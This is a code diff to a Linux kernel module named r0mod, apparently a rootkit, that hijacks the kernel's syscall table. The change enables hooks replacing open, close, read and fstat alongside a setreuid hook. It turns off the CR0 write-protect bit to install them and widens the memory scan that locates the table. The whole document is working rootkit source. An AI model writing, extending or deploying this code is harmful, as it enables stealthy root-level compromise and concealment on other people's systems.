@@ -10,7 +10,7 @@
 #include <r0mod/global.h>
 
 #define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      PAGE_OFFSET + PAGE_SIZE
+#define SEARCH_END      PAGE_OFFSET + 0xffffffff
 
 unsigned long *syscall_table;
 
@@ -60,16 +60,14 @@ unsigned long *find_sys_call_table(void)
 
     for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
     {
-        unsigned long *sct = (unsigned long *)i;
+        unsigned long *sys_call_table = (unsigned long *)i;
 
-        if(sct[__NR_close] == (unsigned long)sys_close)
+        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
         {
-            printk("sys_call_table found @ %lx\n", (unsigned long)sct);
-            return sct;
+            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
+            return sys_call_table;
         }
     }
-
-    printk("sys_call_table NOT found between %lx to %lx", SEARCH_START, SEARCH_END);
 
     return NULL;
 }
@@ -99,17 +97,17 @@ static int __init r0mod_init(void)
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
     syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;
 
-    //orig_open  = (void *)syscall_table[__NR_open];
-    //syscall_table[__NR_open] = (unsigned long)new_open;
+    orig_open  = (void *)syscall_table[__NR_open];
+    syscall_table[__NR_open] = (unsigned long)new_open;
 
-    //orig_close = (void *)syscall_table[__NR_close];
-    //syscall_table[__NR_close] = (unsigned long)new_close;
+    orig_close = (void *)syscall_table[__NR_close];
+    syscall_table[__NR_close] = (unsigned long)new_close;
 
-    //orig_read  = (void *)syscall_table[__NR_read];
-    //syscall_table[__NR_read] = (unsigned long)new_read;
+    orig_read  = (void *)syscall_table[__NR_read];
+    syscall_table[__NR_read] = (unsigned long)new_read;
 
-    //orig_fstat = (void *)syscall_table[__NR_fstat];
-    //syscall_table[__NR_fstat] = (unsigned long)new_fstat;
+    orig_fstat = (void *)syscall_table[__NR_fstat];
+    syscall_table[__NR_fstat] = (unsigned long)new_fstat;
 
     write_cr0(read_cr0() | 0x10000);
 
@@ -126,10 +124,10 @@ static void __exit r0mod_exit(void)
         write_cr0(read_cr0() & (~0x10000));
 
         syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;
-        //syscall_table[__NR_open] = (unsigned long)orig_open;
-        //syscall_table[__NR_close] = (unsigned long)orig_close;
-        //syscall_table[__NR_read] = (unsigned long)orig_read;
-        //syscall_table[__NR_fstat] = (unsigned long)orig_fstat;
+        syscall_table[__NR_open] = (unsigned long)orig_open;
+        syscall_table[__NR_close] = (unsigned long)orig_close;
+        syscall_table[__NR_read] = (unsigned long)orig_read;
+        syscall_table[__NR_fstat] = (unsigned long)orig_fstat;
 
         write_cr0(read_cr0() | 0x10000);
     }
